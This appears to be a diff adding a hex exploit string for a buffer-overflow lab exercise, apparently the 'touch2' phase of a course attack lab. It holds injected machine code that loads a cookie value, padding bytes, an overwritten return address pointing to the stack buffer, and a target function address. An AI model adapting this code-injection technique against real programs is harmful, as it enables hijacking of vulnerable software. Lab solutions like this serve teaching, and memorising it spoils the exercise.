@@ -1,0 +1,7 @@
+48 c7 c7 51 ab 05 66 c3 /* movq cookie, rdi */
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa
+e8 21 63 55 00 00 00 00 /* buffer address */
+5c 18 40 00 00 00 00 00 /* touch2 address */
